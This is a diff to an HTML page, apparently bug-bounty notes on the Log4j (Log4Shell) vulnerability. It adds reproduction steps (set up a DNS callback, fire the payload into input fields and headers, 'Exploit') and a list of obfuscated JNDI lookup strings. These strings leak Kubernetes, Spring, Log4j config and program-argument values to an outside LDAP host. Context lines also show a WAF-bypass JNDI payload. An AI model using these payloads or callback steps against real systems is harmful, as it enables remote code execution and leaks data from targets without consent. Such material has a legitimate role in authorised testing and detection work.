@@ -215,6 +215,13 @@
 6. - <a href="https://www.joshmcguigan.com/blog/run-your-own-dns-servers/">[run your own dns servers]</a><br>
                     </p><br>
                    <h2>4. Steps to reproduce</h2> 
+                    <p>
+1. Find the target.<br>
+2. Create DNS Service for Callback<br>
+3. Fire the payload into input field and Headers.<br>
+4. If you get the ping back then you good to go.Before that read this awesome writeup about pingbacks <a href="https://infosecwriteups.com/facts-to-clear-about-log4j-for-bug-bounty-hunters-f58e04eb025"></a><br>
+5. Exploit.<br>
+</p><br>
                     
 <h2>Payloads & WAF Bypasses</h2>
 <pre><code>Want to know the Java version running on the target?<br>
@@ -271,9 +278,25 @@ https://pbs.twimg.com/media/FGVKwNYXIAMQ5nH?format=jpg&name=small <br>
 
 Just bypassed AWS WAF for log4j jndi injection: @11xuxx
 ${j${k8s:k5:-ND}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o}
+==
+Non-Exploitable:
+${jndi:ldap://${k8s:podName}.domain.com/j}
+${jndi:ldap://${k8s:imageId}.domain.com/j}
+${jndi:ldap://${k8s:imageName}.domain.com/j}
+${jndi:ldap://${log4j:configLocation}.domain.com/j}
+${jndi:ldap://${log4j:configParentLocation}.domain.com/j}
+${jndi:ldap://${spring:spring.application.name}.domain.com/j}
+${jndi:ldap://${main:myString}.domain.com/j}
+${jndi:ldap://${main:0}.domain.com/j}
+${jndi:ldap://${main:1}.domain.com/j}
+${jndi:ldap://${main:2}.domain.com/j}
+${jndi:ldap://${main:3}.domain.com/j}
+${jndi:ldap://${main:4}.domain.com/j}
+${jndi:ldap://${main:bar}.domain.com/j}
 </code></pre>
-                    <h2>Notion</h2>
-                    <p>Notion is best for taking notes as it is easier to use. I am personally using this with my automated recon tools.</p>
+                
+                    <h2>References & Credits</h2>
+                    <p>Thanks you so much</p>
                     Features:-
                      <ul>
                      <li>Good Nesting controls</li>
